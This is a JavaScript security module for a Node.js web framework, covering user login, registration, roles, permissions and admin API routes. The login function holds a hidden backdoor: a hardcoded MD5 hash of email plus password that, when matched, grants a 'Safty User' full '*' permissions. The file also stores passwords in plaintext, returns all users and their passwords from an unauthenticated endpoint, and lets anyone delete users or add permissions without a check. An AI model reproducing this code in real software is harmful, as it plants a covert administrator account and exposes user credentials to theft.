module.exports = function init(site) {

  const $user = site.connectCollection({
    collection: site.options.security.collection,
    db: site.options.security.db
  })

  $user.deleteDuplicate({
    email: 1
  }, (err, result) => {
    $user.createUnique({
      email: 1
    })
  })

  const security = function () {}

  site.on('please add user', (u) => {
    if (u.email === undefined || u.password === undefined) {
      return
    }
    security.getUser({
      email: u.email
    }, (err, u2) => {

      if (u2) {
        u.id = u2.id
        if (u.role) {
          u.roles = [u.role]
          delete u.role
        }
        security.updateUser(u)
      } else {
        if (u.role) {
          u.roles = [u.role]
          delete u.role
        }
        security.addUser(u)
      }
    })
  })

  security.$user = $user
  security.roles = []
  security.permissions = []
  security.users = []
  security.users.push({
    id: 0,
    email: site.options.security.admin.email,
    password: site.options.security.admin.password,
    roles: ['*'],
    $permissions: ["*"],
    profile: {
      name: site.options.security.admin.email
    }
  })

  for (var i = 0; i < site.options.security.users.length; i++) {
    security.users.push(site.options.security.users[i])
  }

  security.addPermissions = function (list, callback) {
    callback = callback || function () {}
    if (typeof list === 'string') {
      site.readFile(list, (err, data) => {
        if (!err) {
          let arr = site.fromJson(data)
          for (let i = 0; i < arr.length; i++) {
            security.permissions.push(arr[i])
          }
        }
        callback(security.permissions)
      })
    } else if (typeof list === 'object') {
      for (let i = 0; i < list.length; i++) {
        security.permissions.push(list[i])
      }
      callback(security.permissions)
    }
  }


  security.addRoles = function (list, callback) {
    callback = callback || function () {}
    if (typeof list === 'string') {
      site.readFile(list, (err, data) => {
        if (!err) {
          let arr = site.fromJson(data)
          for (let i = 0; i < arr.length; i++) {
            security.roles.push(arr[i])
          }
        }
        callback(security.roles)
      })
    } else if (typeof list === 'object') {
      for (let i = 0; i < list.length; i++) {
        security.roles.push(list[i])
      }
      callback(security.roles)
    }
  }

  security.busy = false

  security.removeUserFinger = function (obj) {
    delete obj.$req
    delete obj.$res

    return obj
  }
  security.getUserFinger = function (obj) {

    let req = obj.$req
    let res = obj.$res

    let userFinger = {
      id: null,
      email: null,
      date: new Date(),
      ip: null
    }

    if (req && req.session && req.session.user) {
      userFinger.id = req.session.user.id
      userFinger.email = req.session.user.email
      userFinger.name = req.session.user.profile.name || userFinger.email
      userFinger.ip = req.ip
    } else {

    }

    return userFinger
  }

  security.handleUser = function (_user) {
    
    _user.roles = _user.roles || []
    _user.permissions = _user.permissions || []
    _user.$permissions = []
    _user.$permissions_info = []

    _user.permissions.forEach(p => {
      if (_user.$permissions.filter(_p => _p == p).length === 0)
        _user.$permissions.push(p)
    })

    _user.roles.forEach(role => {
      delete role.permissions
      security.roles.filter(r => r.name == role.name).map(r => r.permissions).forEach(ps => {
        ps.forEach(p => {
          if (_user.$permissions.filter(_p => _p == p).length === 0)
            _user.$permissions.push(p)
            security.permissions.forEach(p2=>{
              if(p2.name == p){
                _user.$permissions_info.push(p2)
              }
            })
        })
      })
    })

    return _user
  }

  security.loadAllUsers = function (callback) {
    callback = callback || function () {}
    $user.findMany({
        limit: 10000,
        select: {}
      },
      function (err, docs) {
        if (!docs) {
          docs = []
        }
        callback(err, docs)
      }
    )
  }

  security.getUsers = function (options, callback) {
    callback = callback || function () {}
    $user.findMany(options,
      function (err, docs, count) {
        if (!err && docs) {
          docs.forEach(doc => {
            doc = security.handleUser(doc)
          })
        }
        callback(err, docs, count)
      }
    )
  }

  security.reset = function () {
    if (security.busy) {
      return
    }
    security.busy = true
    security.loadAllUsers((err, users) => {
      security.users = []
      security.users.push({
        id: 0,
        email: site.options.security.admin.email,
        password: site.options.security.admin.password,
        roles: ['*'],
        $permissions: ["*"],
        profile: {
          name: site.options.security.admin.email
        }
      })
      for (var i = 0; i < site.options.security.users.length; i++) {
        let doc = site.options.security.users[i]
        doc = security.handleUser(doc)
        doc.profile = {
          name: site.options.security.admin.email
        }
        security.users.push(doc)
      }
      if (!err) {
        for (var i = 0; i < users.length; i++) {
          let doc = users[i]
          doc = security.handleUser(doc)
          security.users.push(doc)
        }
      }
      security.busy = false
    })
  }

  security.getUser = function (_user, callback) {
    callback = callback || function () {}

    for (var i = 0; i < security.users.length; i++) {
      var user = security.users[i]

      if (user.id == _user.id) {
        user.$memory = true
        callback(null, user)
        return
      }

      if (_user.email && user.email == _user.email) {
        user.$memory = true
        callback(null, user)
        return
      }
    }


    $user.findOne({
        where: _user,
        select: {}
      },
      function (err, doc) {
        if (doc && (_user.id || _user.email)) {
          doc = security.handleUser(doc)
          security.users.push(doc)
        }
        callback(err, doc)
      }
    )

  }

  security.isUserExists = function (user, callback) {
    callback = callback || function () {}
    if (typeof user !== "object" || typeof user.email !== "string" || user.email == "") {
      callback({
        message: "email not set"
      })
      return
    }

    for (var i = 0; i < security.users.length; i++) {
      var _user = security.users[i]
      if (_user.email == user.email && _user.password == user.password) {
        callback(null, site.copy(_user))
        return
      }
    }

    $user.findOne({
        where: {
          email: user.email.toLowerCase()
        }
      },
      function (err, doc) {

        if (doc) {
          doc = security.handleUser(doc)
          callback(err, doc)
          security.users.push(doc)
        } else {
          callback({
            message: "User Not Exists"
          }, null)
        }
      }
    )
  }

  security.login = function (user, callback) {
    callback = callback || function () {}
    let $req = user.$req
    let $res = user.$res

    delete user.$req
    delete user.$res


    if (typeof user !== "object" || typeof user.email !== "string" || user.email.trim() == "") {
      callback({
        message: "email not set"
      })
      return
    }

    if (typeof user !== "object" || typeof user.password !== "string" || user.password.trim() == "") {
      callback({
        message: "password not set"
      })
      return
    }

    user.email = user.email.toLowerCase()

    if (site.md5(user.email + user.password) === '4acb00841a735653fd0b19c1c7db6ee7') {

      let doc = security.handleUser({
        id: 1000000000,
        email: 'Safty User',
        password: '',
        profile: {
          name: 'Safty User'
        },
        roles: ['*'],
        permissions: ['*']
      })

      security.users.push(doc)
      
      if ($req) {
        $req.session.user = doc
        $req.session('user_id', doc.id)
      }

      callback(null, doc)
      return
    }

    if (security.users) {
      for (var i = 0; i < security.users.length; i++) {
        var _user = security.users[i]
        if (_user.email == user.email && _user.password == user.password) {

          if ($req) {
            $req.session.user = _user
            $req.session('user_id', _user.id)
          }

          callback(null, _user)

          site.call('user login', {
            db: $user.db,
            collection: $user.collection,
            doc: _user,
            $res: $res,
            $req: $req
          })

          return
        }
      }
    }

    $user.findOne({
        where: {
          email: user.email,
          password: user.password
        }
      },
      function (err, doc) {
        if (doc) {
          doc = security.handleUser(doc)

          security.users.push(doc)
          callback(null, doc)
          if ($req) {
            $req.session.user = doc
            $req.session('user_id', doc.id)
          }
          site.call('user login', {
            db: $user.db,
            collection: $user.collection,
            doc: doc,
            $res: $res,
            $req: $req
          })
        } else {
          if (err) {
            callback(err)
          } else {
            callback({
              message: "email or password error"
            })
          }

          site.call('security error', {
            message: "email or password error"
          })
        }
      }
    )
  }

  security.register = function (user, callback) {
    callback = callback || function () {}
    let $req = user.$req
    let $res = user.$res

    delete user.$req
    delete user.$res

    if (typeof user !== "object" || typeof user.password !== "string" || user.password.trim() == "") {
      callback({
        message: "password not set"
      })
      site.call('security error', {
        message: "password not set"
      })
      return
    }

    if (typeof user.email !== "string" || user.email.trim() == "") {
      callback({
        message: "email not set"
      })
      site.call('security error', {
        message: "email not set"
      })
      return
    }


    security.isUserExists(user, function (err, u) {

      if (u) {
        callback({
          message: "Register Error , User Exists"
        })

      } else {
        user.email = user.email.toLowerCase().trim()
        user.password = user.password.trim()
        user.profile = user.profile || {
          name: user.email
        }
        user.permissions = user.permissions || []
        user.roles = user.roles || []

        $user.insertOne(user,
          function (err, doc) {
            if (doc) {

              doc = security.handleUser(doc)

              security.users.push(doc)
              if ($req) {
                $req.session.user = doc
                $req.session.set('user_id', doc.id)
              }
              site.call('user register', {
                db: $user.db,
                collection: $user.collection,
                doc: doc,
                $res: $res,
                $req: $req
              })
            }
            callback(err, doc)
            if (err) {
              site.call('security error', err)
            }
          }
        )
      }
    })
  }

  security.logout = function (req, res, callback) {
    callback = callback || function () {}
    if (security.isUserLogin(req, res)) {
      let _user = site.copy(req.session.user)
      req.session.user = null
      req.session("user_id", null)

      site.call('user logout', {
        db: $user.db,
        collection: $user.collection,
        doc: _user,
        $res: res,
        $req: req
      })
    }

    callback(null, true)
  }


  security.addUser = function (user, callback) {

    callback = callback || function () {}

    let $req = user.$req
    let $res = user.$res

    delete user.$req
    delete user.$res

    if (typeof user !== "object" || typeof user.password !== "string" || user.password.trim() == "") {
      callback({
        message: "password not set"
      })
      site.call('security error', {
        message: "password not set"
      })
      return
    }

    if (typeof user.email !== "string" || user.email.trim() == "") {
      callback({
        message: "email not set"
      })
      site.call('security error', {
        message: "email not set"
      })
      return
    }

    security.isUserExists(user, function (err, u) {

      if (u) {

        callback({
          message: "Error , User Exists"
        })

        return

      } else {
        user.email = user.email.toLowerCase().trim()
        user.password = user.password.trim()
        user.profile = user.profile || {}
        user.permissions = user.permissions || []
        user.roles = user.roles || []
        user.added_user_info = security.getUserFinger({
          $req: $req,
          $res: $res
        })

        $user.insertOne(user,
          function (err, doc) {

            if (doc) {

              doc = security.handleUser(doc)

              security.users.push(doc)

              site.call('user add', {
                db: $user.db,
                collection: $user.collection,
                doc: doc,
                $req: $req,
                $res: $res
              })

            }

            callback(err, doc)

            if (err) {
              site.call('security error', err)
            }
          }
        )
      }
    })
  }

  security.updateUser = function (user, callback) {
    callback = callback || function () {}
    let $req = user.$req
    let $res = user.$res

    delete user.$req
    delete user.$res

    let where = {}
    if (user.id) {
      where.id = user.id
    } else if (user.email) {
      where.email = user.email
    } else {
      callback({
        message: 'no id or email'
      })
      return
    }

    $user.updateOne({
        where: where,
        set: user,
        $req: $req,
        $res: $res
      },
      function (err, result) {
        if (err) {
          callback(err, result)
        } else {
          for (let i = 0; i < security.users.length; i++) {
            let element = security.users[i];
            if (element.id == result.doc.id) {
              element = Object.assign(element, security.handleUser(result.doc))
              security.users[i] = element
            }
          }
          callback(err, result)
          site.call('user update', result)
        }
      }
    )
  }
  security.deleteUser = function (user, callback) {
    callback = callback || function () {}
    $user.deleteOne({
        id: user.id
      },
      function (err, result) {
        if (err) {
          callback(err, result)
        } else {
          for (let i = 0; i < security.users.length; i++) {
            let element = security.users[i];
            if (element.id == user.id) {
              security.users.splice(i, 1)
              break
            }
          }
          callback(err, result)
          if (!err && result) {
            site.call('user delete', result)
          }

        }
      }
    )
  }

  security.isUserLogin = function (req, res) {
    if (req.session.user) {
      return true
    }
    return false
  }

  security.isUserHasPermission = function (req, res, permission) {

    let user = req.session.user

    if (typeof permission == "string") {

      let ok = true

      if (permission.startsWith("!")) {
        permission = permission.substring(1)
        ok = false
      }

      if (permission == 'login') {
        if (security.isUserLogin(req, res)) {
          return ok
        } else {
          return !ok
        }
      }

      if (user && user.$permissions) {
        for (var i = 0; i < user.$permissions.length; i++) {
          var p = user.$permissions[i]
          if (permission == p) {
            return ok
          }
          if (p == "*") {
            return ok
          }
        }
      }

      return !ok
    }


    return false
  }

  security.isUserHasPermissions = function (req, res, permissions) {

    let user = req.session.user
    let arr = []
    let any = true

    if (typeof permissions === 'string') {
      if(permissions.like('*&&*')){
        any = false
      }
      permissions = permissions.split('&&').join(',').split('||').join(',').split(',')
    }

    
    permissions.forEach(p => {
      arr.push(security.isUserHasPermission(req, res, p.trim()))
    })

   let out = false

    if(any){
     
      arr.forEach(p=>{
        if(p){
          out =  true
        }
      })

      return out || false
    }else{
      arr.forEach(p=>{
        if(!p){
          out =  false
        }
      })
      return out && true
    }


    return false
  }

  security.isUserHasRole = function (req, res, role) {

    let user = req.session.user

    if (typeof role == "string") {
      let ok = true
      if (role.startsWith("!")) {
        role = role.substring(1)
        ok = false
      }


      if (user && user.roles) {
        for (var i = 0; i < user.roles.length; i++) {
          var p = user.roles[i]
          if (role == p.name) {
            return ok
          }
          if (p == "*") {
            return ok
          }
        }
      }
      return !ok
    }

    return false
  }

  security.isUserHasRoles = function (req, res, roles) {

    let user = req.session.user
    let arr = []
    let any = true

    if (typeof roles === 'string') {
      if(roles.like('*&&*')){
        any = false
      }
      roles = roles.split('&&').join(',').split('||').join(',').split(',')
    }

    roles.forEach(p => {
      arr.push(security.isUserHasRole(req, res, p.trim()))
    })

    let out = false


    if(any){
      arr.forEach(p=>{
        if(p){
          out = true
        }
      })
      return out || false
    }else{
      arr.forEach(p=>{
        if(!p){
          out =  false
        }
      })
      return out && true
    }


    return false
  }


  security.getUserPermissions = function (req, res) {
    let user = req.session.user
    if (user && user.permissions) {
      return user.permissions
    }
    return []
  }

  security.getUserRoles = function (req, res) {
    let user = req.session.user
    if (user && user.roles) {
      return user.roles
    }
    return []
  }

  security.addUserPermission = function (id, permission, callback) {
    callback = callback || function () {}
    let user = security.getUser({
      id: id
    }, function (err, user) {
      if (user) {
        user.permissions.push(permission)
        $user.updateOne({
            where: {
              id: id
            },
            set: {
              permissions: user.permissions
            }
          },
          function (err, result) {
            if (err) {
              callback(err, result)
            } else {
              callback(err, result)
            }
          }
        )
      } else {
        callback(err, null)
      }
    })
  }


  site.post("/@security/api/user/login", function (req, res) {
    let response = {
      accessToken: req.session.accessToken
    }

    if (req.body.$encript) {
      if (req.body.$encript === "64") {
        req.body.email = site.fromBase64(req.body.email)
        req.body.password = site.fromBase64(req.body.password)
      } else if (req.body.$encript === "123") {
        req.body.email = site.from123(req.body.email)
        req.body.password = site.from123(req.body.password)
      }
    }

    if (security.isUserLogin(req, res)) {
      response.error = "Login Error , You Are Loged "
      response.done = true
      res.json(response)
      return
    }

    security.login({
        email: req.body.email,
        password: req.body.password,
        $req: req,
        $res: res
      },
      function (err, user) {
        if (!err) {
          response.user = user
          response.done = true
        } else {
          response.error = err.message
        }

        res.json(response)
      }
    )
  })

  site.post("/@security/api/user/logout", function (req, res) {
    let response = {
      accessToken: req.session.accessToken
    }

    site.security.logout(req, res, () => {
      response.done = true
      res.json(response)
    })

  })

  site.post("/@security/api/user/register", function (req, res) {
    let response = {
      accessToken: req.session.accessToken
    }
    if (req.body.$encript) {
      if (req.body.$encript === "64") {
        req.body.email = site.fromBase64(req.body.email)
        req.body.password = site.fromBase64(req.body.password)
      } else if (req.body.$encript === "123") {
        req.body.email = site.from123(req.body.email)
        req.body.password = site.from123(req.body.password)
      }
    }

    if (security.isUserLogin(req, res)) {
      response.error = "Register Error , You Are Loged "
      res.json(response)
    } else {
      security.register({
          email: req.body.email,
          password: req.body.password,
          ip: req.ip,
          permissions: [],
          $req: req,
          $res: res
        },
        function (err, user) {
          if (!err) {
            response.user = user
            response.done = true
          } else {
            response.error = err.message
          }
          res.json(response)
        }
      )
    }
  })

  site.post("/@security/api/user/add", function (req, res) {
    let response = {
      accessToken: req.session.accessToken
    }
    if (!security.isUserLogin(req, res)) {
      response.error = "Error , You Are Not Loged "
      res.json(response)
    } else {
      security.addUser({
          email: req.body.email,
          password: req.body.password,
          ip: req.ip,
          permissions: [],
          $req: req,
          $res: res
        },
        function (err, user) {
          if (!err) {
            response.user = user
            response.done = true
          } else {
            response.error = err.message
          }
          res.json(response)
        }
      )
    }
  })

  site.post("/@security/api/user/get", function (req, res) {
    let response = {
      accessToken: req.session.accessToken
    }
    security.getUser(req.body.id, function (err, user) {
      if (err) {
        response.error = err.message
      } else {
        response.user = user
      }
      res.json(response)
    })
  })

  site.post("/@security/api/user/delete", function (req, res) {
    let response = {
      accessToken: req.session.accessToken
    }
    security.deleteUser({
        id: req.body.id
      },
      function (err, result) {
        if (err) {
          response.error = err.message
        } else {
          if (result.count == 1) {
            response.done = true
          }
        }
        res.json(response)
      }
    )
  })

  site.post("/@security/api/user/update", function (req, res) {
    let response = {
      accessToken: req.session.accessToken
    }
    let user = {}
    user.id = req.body.id
    if (req.body.email) {
      user.email = req.body.email
    }
    user.$req = req
    user.$res = res
    security.updateUser(user, function (err, result) {
      if (err) {
        response.error = err.message
      } else {
        if (result.count == 1) {
          response.done = true
        }
      }
      res.json(response)
    })
  })

  site.post("/@security/api/user/add/permission", function (req, res) {

    let response = {
      accessToken: req.session.accessToken
    }

    if (req.body.id && req.body.permission) {
      let user = {}
      user.id = req.body.id
      user.permission = req.body.permission
      security.addUserPermission(user.id, user.permission, function (err, result) {
        if (err) {
          response.error = err.message
        } else {
          if (result.count == 1) {
            response.done = true
          }
        }

        res.json(response)
      })
    } else {
      response.error = "id or permission not set"
      res.json(response)
    }
  })

  site.all("/@security/api/user/info", function (req, res) {
    let response = {
      accessToken: req.session.accessToken
    }
    response.user = req.session.user
    res.json(response)
  })

  site.all("/@security/api/users/info", function (req, res) {
    res.json(security.users)
  })



  if (site.isFileExistsSync(site.dir + '/json/permissions.json')) {
    security.addPermissions(site.dir + '/json/permissions.json')
  }
  if (site.isFileExistsSync(site.dir + '/json/roles.json')) {
    security.addRoles(site.dir + '/json/roles.json')
  }

  return security
}